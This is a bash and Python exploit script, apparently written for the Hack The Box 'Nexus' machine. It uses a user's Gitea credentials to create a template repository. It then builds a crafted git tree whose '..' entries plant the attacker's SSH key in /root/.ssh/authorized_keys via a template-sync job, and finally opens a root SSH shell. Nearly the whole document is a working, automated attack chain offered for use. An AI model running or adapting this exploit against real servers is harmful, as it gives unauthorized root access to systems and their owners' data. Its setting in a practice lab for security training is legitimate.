#!/bin/bash
# Nexus HTB - Full Auto Exploit
# Usage: bash exploit.sh <target_ip> <attacker_ip> <jones_password>

TARGET=$1
ATTACKER=$2
JONES_PASS=$3
GITEA_URL="http://git.nexus.htb"

if [[ -z "$TARGET" || -z "$ATTACKER" || -z "$JONES_PASS" ]]; then
    echo "Usage: $0 <target_ip> <attacker_ip> <jones_password>"
    exit 1
fi

echo "[*] Adding hosts entry..."
grep -q "nexus.htb" /etc/hosts || echo "$TARGET nexus.htb git.nexus.htb billing.nexus.htb" >> /etc/hosts

echo "[*] Generating SSH keypair..."
ssh-keygen -t ed25519 -f /tmp/.k -N '' -q <<< y 2>/dev/null

PUB_KEY=$(cat /tmp/.k.pub)
echo "[+] Public key: $PUB_KEY"

echo "[*] Creating Gitea repo via API..."
curl -s -X POST "$GITEA_URL/api/v1/user/repos" \
    -u "jones:$JONES_PASS" \
    -H "Content-Type: application/json" \
    -d '{
        "name": "RCE",
        "private": false,
        "template": true,
        "auto_init": false
    }' > /dev/null

echo "[*] Cloning repo..."
rm -rf /tmp/rce
git clone "http://jones:$JONES_PASS@git.nexus.htb/jones/RCE.git" /tmp/rce 2>/dev/null
cd /tmp/rce || { echo "[-] Clone failed"; exit 1; }

echo "[*] Building malicious git tree..."
cat > /tmp/build.py << 'PYEOF'
#!/usr/bin/env python3
import hashlib, zlib, os, subprocess, sys, time

def write_obj(data, t):
    h = ("%s %d" % (t, len(data))).encode() + b"\x00"
    s = h + data
    sha = hashlib.sha1(s).hexdigest()
    d = os.path.join(".git", "objects", sha[:2])
    os.makedirs(d, exist_ok=True)
    p = os.path.join(d, sha[2:])
    if not os.path.exists(p):
        open(p, "wb").write(zlib.compress(s))
    return sha

def entry(mode, name, sha):
    return ("%s %s" % (mode, name)).encode() + b"\x00" + bytes.fromhex(sha)

if not os.path.isdir(".git"):
    print("Run inside git repo"); sys.exit(1)

r = subprocess.run(["cat", "/tmp/.k.pub"], capture_output=True, text=True)
if r.returncode != 0:
    print("Key not found"); sys.exit(1)
key = r.stdout.strip() + "\n"

blob    = write_obj(key.encode(), "blob")
readme  = write_obj(b"# Template\n", "blob")
ssh_t   = write_obj(entry("100644", "authorized_keys", blob), "tree")
cur     = write_obj(entry("40000", ".ssh", ssh_t), "tree")
fir     = write_obj(entry("40000", "root", cur), "tree")

for i in range(4):
    fir = write_obj(entry("40000", "..", fir), "tree")

root = write_obj(
    entry("100644", "README.md", readme) + entry("40000", "..", fir),
    "tree"
)
ts = int(time.time())
c = "tree %s\nauthor x <x@x> %d +0000\ncommitter x <x@x> %d +0000\n\ninit\n" % (root, ts, ts)
sha = write_obj(c.encode(), "commit")
os.makedirs(os.path.join(".git", "refs", "heads"), exist_ok=True)
open(os.path.join(".git", "refs", "heads", "main"), "w").write(sha + "\n")
print("Done: " + sha)
PYEOF

python3 /tmp/build.py

echo "[*] Pushing malicious tree..."
git -C /tmp/rce push "http://jones:$JONES_PASS@git.nexus.htb/jones/RCE.git" main --force 2>/dev/null

echo "[*] Waiting for gitea-template-sync.timer to fire (max 90s)..."
for i in $(seq 1 18); do
    sleep 5
    # Try SSH - if it works we're done
    ssh -i /tmp/.k \
        -o StrictHostKeyChecking=no \
        -o ConnectTimeout=3 \
        -o BatchMode=yes \
        root@nexus.htb "id" 2>/dev/null && break
    echo "    [~] ${i}/${18} - waiting..."
done

echo ""
echo "[*] Attempting root shell..."
ssh -i /tmp/.k \
    -o StrictHostKeyChecking=no \
    root@nexus.htb
